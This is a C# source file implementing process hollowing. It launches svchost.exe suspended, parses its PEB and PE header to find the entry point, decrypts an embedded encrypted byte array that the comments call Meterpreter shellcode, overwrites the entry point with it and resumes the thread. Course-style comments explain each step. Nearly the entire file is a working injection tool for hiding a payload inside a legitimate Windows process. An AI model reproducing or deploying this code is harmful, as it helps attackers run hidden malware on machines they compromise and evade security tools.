﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;


namespace ProcessHollowingLib
{
    public class ProcHollower
    {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(
            IntPtr hProcess,
            int procInformationClass,
            ref PROCESS_BASIC_INFORMATION procInformation,
            uint ProcInfoLen,
            ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            [Out] byte[] lpBuffer,
            int dwSize,
            out IntPtr lpNumberOfBytesRead);


        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(
               IntPtr hProcess,
               IntPtr lpBaseAddress,
               byte[] lpBuffer,
               Int32 nSize,
               out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        public static string Password { get; set; }

        public static string IV { get; set; }

        public static int DoWork()
        {
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            bool res = CreateProcess(
                 null,
                "C:\\Windows\\System32\\svchost.exe",
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                0x4,
                IntPtr.Zero,
                null,
                ref si,
                out pi);

            //fetch the address of the PEB from the PROCESS_BASIC_INFORMATION structure
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

            //The ptrToImageBase variable now contains a pointer to the image base of svchost.exe
            //Following the DllImport, we can call ReadProcessMemory by specifying an 8 - byte buffer that is
            //then converted to a 64bit integer through the BitConverter.ToInt64278 method and then casted to a
            //pointer using (IntPtr)
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            //The following step is to parse the PE header to locate the EntryPoint.This is performed by calling
            //ReadProcessMemory again with a buffer size of 0x200 bytes
            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

            //To parse the PE header, we must read the content at offset 0x3C and use that as a second offset
            //when added to 0x28 convert the four bytes at offset e_lfanew plus 0x28 into an unsigned integer. 
            //This value is the offset from the image base to the EntryPoint
            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);

            //The offset from the base address of svchost.exe to the EntryPoint is also called the relative virtual
            //address(RVA).We must add it to the image base to obtain the full memory address of the EntryPoint.
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
            //This is encryped/shifted using the project
            //https://github.com/sbridgens/ProcessHollowing/tree/main/ShellCodeEncrypter
            byte[] buf = new byte[] {
              0x04,0x64,0x6f,0x4b,0xf5,0x68,0x85,0x33,0x13,0x35,0x77,0xc1,0x66,0xb0,0x72,0xe6,0xba,0x08,0x71,0xe5,0x68,0x72,0x2a,0x25,0xd0,0xd1,0x94,0xc3,0x4b,0x90,0x4c,0xf6,0xa1,0x29,0xff,0x80,0xb6,0x5d,0x11,0x26,0x1d,0x7c,0x9d,0x6f,0x44,0x57,0x25,0x84,0x6e,0x41,0x7d,0x76,0x9b,0x1f,0xfc,0xf3,0x4e,0x1d,0x1e,0x63,0x26,0xdc,0x6d,0x1e,0x49,0xb6,0x2c,0xd2,0x35,0x1f,0xd3,0x78,0x5f,0x2f,0xc8,0xa6,0x6b,0x47,0xbd,0x5b,0x1a,0x1b,0x82,0x1a,0x47,0x23,0xb3,0xd6,0x91,0x8e,0x21,0xcc,0xf8,0x32,0x95,0x26,0xd9,0x2f,0xd9,0x3d,0x00,0xe5,0xb8,0xae,0x22,0xb4,0x34,0x8c,0xb9,0x23,0x56,0xaf,0xcb,0x36,0xb1,0x89,0x4d,0xd4,0x6d,0x0c,0x6f,0xd9,0x7d,0xb7,0x45,0xb0,0x13,0x0e,0xaf,0x0f,0x96,0x2d,0x42,0x77,0x74,0xf4,0x2b,0xc5,0x87,0xf6,0x4c,0xb7,0xb2,0x84,0xcf,0x56,0xe7,0x33,0x9e,0x69,0xe7,0xc5,0xbe,0xdc,0xcf,0x53,0xbb,0xee,0x6f,0x4a,0x47,0x11,0xdc,0x4e,0xd9,0x5e,0xdd,0x6d,0x8e,0x9d,0xe0,0x10,0xc3,0x9d,0x36,0xb2,0x82,0x07,0xdd,0x03,0x8e,0x76,0x99,0xa4,0xde,0x7d,0x5a,0x3c,0xad,0xc9,0x00,0x3c,0x5b,0x04,0xc9,0xda,0x08,0xfe,0x43,0x2f,0xd9,0xff,0xf3,0xdb,0x7b,0xcf,0x36,0x8d,0x01,0xd6,0x56,0x06,0x8e,0x0d,0xce,0xec,0x8b,0x5f,0x94,0x52,0x47,0xbc,0xc2,0x02,0x25,0x8e,0x4d,0x7f,0xc9,0x6d,0xaa,0x6c,0x3c,0xea,0x8e,0x60,0x7b,0x7e,0x0c,0x47,0x6d,0x16,0x42,0xe1,0x04,0xc8,0xb4,0x23,0x43,0x5f,0x8d,0xaa,0xdb,0x96,0xd6,0x8e,0x79,0xbe,0xac,0xaa,0xd6,0xe4,0xf9,0x23,0xad,0xb8,0xb9,0xef,0xcb,0xb9,0xd3,0xa1,0xf0,0x80,0x25,0x0c,0x18,0xf5,0x74,0x0d,0x5f,0x54,0xdc,0xcb,0x6e,0x22,0x2a,0x2c,0xb5,0xa8,0x09,0xc0,0xfe,0x0b,0x99,0xfe,0x5a,0xd7,0xe3,0x0e,0xbf,0x0e,0x2b,0x2f,0x6c,0xaf,0xf2,0x41,0xfd,0xc7,0xfe,0x00,0x97,0xe0,0x2f,0xf0,0x44,0x3b,0xc2,0x89,0xb9,0x1f,0x5c,0x24,0x98,0xb8,0x49,0x1a,0xe6,0x86,0x28,0x7d,0x86,0xd9,0xa5,0x80,0x89,0x1d,0xe6,0xbe,0xc8,0xc7,0x9e,0x7f,0x2a,0xb2,0x5f,0x9f,0xa0,0x83,0x43,0xb2,0xee,0xf4,0x9c,0xd8,0x58,0x6c,0x5b,0x62,0x6f,0x80,0xe3,0x1a,0xd1,0x87,0x08,0xd2,0xe2,0x00,0x21,0x54,0x5e,0x10,0x22,0xc5,0xd7,0xd2,0x4d,0x66,0xe5,0x5e,0x73,0x9c,0x12,0x3f,0x6d,0x75,0x42,0xd9,0x47,0xd5,0x8d,0x9d,0x90,0xca,0xaf,0x24,0x52,0xb0,0xb6,0xf8,0x76,0x00,0x2b,0x4b,0x59,0x4c,0x45,0x53,0x35,0x2f,0x7b,0xc5,0x95,0xa0,0x68,0xb4,0x49,0xe8,0xce,0x41,0xa2,0x96,0x44,0x21,0xb7,0x17,0xef,0xa3,0x09,0xf1,0x58,0x32,0xf7,0x85,0x61,0x4e,0x32,0x95,0xfb,0x74,0x0a,0x45,0xa5,0x54,0x5a,0x77,0xba,0xbc,0x91,0x1d,0x9c,0xf6,0x5e,0x78,0xea,0x87,0x95,0x5b,0x33,0x99,0x8a,0x34,0x2b,0xef,0xdc,0x75,0x90,0x21,0xc3,0x83,0x94,0x5c,0xb1,0x53,0x68,0x53,0x46,0xb6,0x0f,0xee,0xd4,0x00,0xbf,0x79,0x9a,0x4b,0xbf,0x90,0x95,0x1a,0x02,0x67,0xb4,0x17,0xf6,0x83,0xc8,0x45,0xb5,0xcc,0x52,0xaf,0xfb,0xd6,0x5e,0x83,0xc6,0xdc,0xdf,0xf1
            };

            buf = PFuncs.CaesarDecrypt(buf, Password, Convert.FromBase64String(IV));

            //We have obtained the address of the EntryPoint so we can generate our Meterpreter shellcode
            //and use WriteProcessMemory to overwrite the existing code as shown in Listing 202.Remember
            //that we must add a DllImport statement for WriteProcessMemory before using it.
            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);

            //When CreateProcessW started svchost.exe and populated the PROCESS_INFORMATION
            //structure, it also copied the handle of the main thread into it. 
            //We can then import ResumeThread and call it directly.
            ResumeThread(pi.hThread);
            return 0;
        }
    }
}
